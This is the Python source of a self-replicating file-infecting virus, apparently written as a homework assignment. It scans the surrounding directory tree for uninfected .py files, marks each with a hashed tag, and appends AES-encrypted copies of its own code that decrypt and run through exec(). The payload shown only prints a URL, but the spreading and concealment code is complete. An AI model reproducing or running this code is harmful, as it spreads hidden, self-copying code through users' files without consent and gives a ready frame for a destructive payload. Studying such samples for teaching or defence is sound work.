# 23da2e9b5129307a50f4304e66b21b324ee23f6448b79aae4753a14be677bab7
# above line is the hashed value of infectedmark, it marks this file as infected

import string
import random
from fnmatch import fnmatch
from Crypto.Cipher import AES
from Crypto import Random
import hashlib
import base64
import ntpath
import math
from os.path import isfile, join
from os import listdir
import os.path
import sys

# returns the hashed value of a given string, used for markings
def GenerationGetHashOfMarkCopied(mark):
    encoded = mark.encode('utf-8')
    hashed = hashlib.sha256(encoded).hexdigest()
    return hashed


# returns a random 16 bytes key
def GenerationGetRandomKey():
    randomKey = ""
    for k in range(16):
        randomKey += random.choice(string.ascii_letters)

    return randomKey.encode()


# this file only runs the below method (then exits), this method generates a new virus file
# once the new virus file is generated, this file is no longer needed
# this file is provided for the homework, to show the source code of the virus
def GenerateFirstVirusCode():
    # target a file named virus.py, if it doesn't exist, it will be created
    targetFile = os.path.join(os.path.dirname(
        os.path.abspath(__file__)), "virus.py")

    # get hashed values of markings, these will be inserted to the virus file
    infectedMark = "# " + GenerationGetHashOfMarkCopied("infectedmark")
    fileBeginMark = "# " + GenerationGetHashOfMarkCopied("beginmark")
    encryptionEndMark = "# " + GenerationGetHashOfMarkCopied("encryptionend")
    fileEndMark = "# " + GenerationGetHashOfMarkCopied("endmark")

    # preInjection and postInjection stores the parts of the file that we
    # don't want to encrypt, for example preInjection stores imports
    # I stopped using postInjection after refactor but it stays here
    # encryptedInjection stores parts of the file that needs to be encrypted
    preInjection = ""
    postInjection = ""
    encryptedInjection = ""

    # get the current running file
    currentFilePath = sys.argv[0]
    currentFile = open(currentFilePath, "r")
    currentFileLines = currentFile.readlines()
    currentFile.close()

    # flags that will be set after encountering markings such as begin, end, etc.
    injectionCodeStarted = False
    encryptedInjectionStarted = False
    encryptedInjectionEnded = False

    # in this for loop, I store encrypted and unencrypted parts of the file
    # with the help of markings and helps.
    for line in currentFileLines:
        if (GenerationGetHashOfMarkCopied("endmark") in line):
            break
        elif (GenerationGetHashOfMarkCopied("encryptionend") in line):
            encryptedInjectionEnded = True

        if (injectionCodeStarted and not encryptedInjectionStarted):
            preInjection += line
        elif (injectionCodeStarted and encryptedInjectionStarted and not encryptedInjectionEnded):
            encryptedInjection += line
        elif (injectionCodeStarted and encryptedInjectionEnded):
            postInjection += line

        if (GenerationGetHashOfMarkCopied("beginmark") in line):
            injectionCodeStarted = True
        elif (GenerationGetHashOfMarkCopied("encryptionbegin") in line):
            encryptedInjectionStarted = True

    # generate a new key, nonce and then encrypt encryptedInjection string
    # encryptedInjection stores parts of the file that needs to be encrypted
    key = GenerationGetRandomKey()
    cipher = AES.new(key, AES.MODE_EAX)
    nonce = cipher.nonce
    encryptedInjection, tag = cipher.encrypt_and_digest(encryptedInjection.encode())

    # write to the virus.py file, insert markings, unencrypted code and encrypted code
    with open(targetFile, "w") as fa:
        print(infectedMark, file=fa)
        print(fileBeginMark, file=fa)
        print(preInjection, file=fa)
        print(encryptionEndMark, file=fa)
        print("code = {}".format(encryptedInjection), file=fa)
        print("cipher = AES.new({}, AES.MODE_EAX, nonce={})".format(key, nonce), file=fa)
        print("code = cipher.decrypt(code).decode()", file=fa)
        print("exec(code)", file=fa)
        print(fileEndMark, file=fa)
        fa.close()


# this file only runs the virus.py generation code then exits
# actual virus code is below the exit function
GenerateFirstVirusCode()
exit()

# below line is the hashed value of beginmark, it marks the beginning of the virus code
# 32f50981ddbfb80fc2ded8f8c2ead93877c80d64cb931c4410ad6620ae761dd0

import string
import random
from fnmatch import fnmatch
from Crypto.Cipher import AES
from Crypto import Random
import hashlib
import base64
import ntpath
import math
from os.path import isfile, join
from os import listdir
import os.path
import sys

# below line is the hashed value of encryptionbegin, it marks the beginning of the encrypted virus code
# c312d62c07c4d6e7109a43b6cf6c9eb1bbfaa460483bc08cba71196171b5a7e9

# returns the hashed value of a given string, used for markings
def GetHashOfMark(mark):
    encoded = mark.encode('utf-8')
    hashed = hashlib.sha256(encoded).hexdigest()
    return hashed

# returns a random 16 bytes key
def GetRandomKey():
    randomKey = ""
    for k in range(16):
        randomKey += random.choice(string.ascii_letters)

    return randomKey.encode()

# this method returns list of files that are not already infected
# it uses the hashed value of infectedmark to detect whether a python file is infected or not
def GetVictimFiles():
    pythonFiles = []
    currentDir = os.path.dirname(os.path.abspath(__file__))

    for path, subdirs, files in os.walk(currentDir):
        for name in files:
            filePath = os.path.join(path, name)
            if (len(filePath) > 3 and filePath[-3:] == ".py"):
                with open(filePath, 'r') as f:
                    lines = f.readlines()
                    if (len(lines) > 0 and not (GetHashOfMark("infectedmark") in lines[0])):
                        pythonFiles.append(filePath)

                    f.close()

    return pythonFiles


# this method takes a list of python files as a parameter and infects them
def InfectVictims(victims):
    # get hashed values of markings, these will be inserted to the virus file
    infectedMark = "# " + GetHashOfMark("infectedmark")
    encryptionBeginMark = "# " + GetHashOfMark("encryptionbegin")
    encryptionEndMark = "# " + GetHashOfMark("encryptionend")
    fileEndMark = "# " + GetHashOfMark("endmark")

    # stores the imports, unencrypted, filled inside the below loop
    imports = ""

    # get the current running file
    currentFilePath = sys.argv[0]
    currentFile = open(currentFilePath, "r")
    currentFileLines = currentFile.readlines()
    currentFile.close()

    # flags that will be set after encountering markings such as begin, end, etc.
    virusCodeBegin = False
    encryptedCodeBegin = False
    encryptedCodeEnd = False

    # in this for loop, I store the import lines in imports variable
    for line in currentFileLines:
        if (GetHashOfMark("beginmark") in line):
            virusCodeBegin = True
        elif (GetHashOfMark("encryptionbegin") in line):
            encryptedCodeBegin = True

        if (virusCodeBegin and not encryptedCodeBegin):
            imports += line

        if (GetHashOfMark("endmark") in line):
            break
        elif (GetHashOfMark("encryptionend") in line):
            encryptedCodeEnd = True

    # insert markings, encrypted virus code, unencrypted import lines etc. into the victim
    for victim in victims:
        # generate a new key, nonce and then encrypt the code variable.
        # notice that the code variable is not created in this file.
        # it is stored in the ram, once it is decrypted in the infected file.
        # check an infected file to see the variable named code.
        key = GetRandomKey()
        cipher = AES.new(key, AES.MODE_EAX)
        nonce = cipher.nonce
        virusCode, tag = cipher.encrypt_and_digest(code.encode())

        with open(victim, 'r+') as fp:
            content = fp.read()
            fp.seek(0, 0)
            print(infectedMark, file=fp)
            print(content, file=fp)
            fp.close()

        with open(victim, "a") as fa:
            print(imports, file=fa)
            print(encryptionBeginMark, file=fa)
            print(encryptionEndMark, file=fa)
            print("code = {}".format(virusCode), file=fa)
            print("cipher = AES.new({}, AES.MODE_EAX, nonce={})".format(
                key, nonce), file=fa)
            print("code = cipher.decrypt(code).decode()", file=fa)
            print("exec(code)", file=fa)
            print(fileEndMark, file=fa)
            fa.close()


# a very boring payload, it is there to show that files are infected succesfully
def ExecutePayload():
    print("https://en.wikipedia.org/wiki/Vaccine_hesitancy")


def main():
    victims = GetVictimFiles()
    InfectVictims(victims)
    ExecutePayload()


if __name__ == '__main__':
    main()

# a833bd47456ed20f5ed321ada5b03f3603de055b69477c26350696af65e76c6a
# above line is the hashed value of encryptionend, it marks the ending of the encrypted virus code

# da94275a2621b81e109aaed7a41f730a8581c58ce14d3611b3e09c54814b4fcd
# above line is the hashed value of endmark, it marks the ending of the virus code
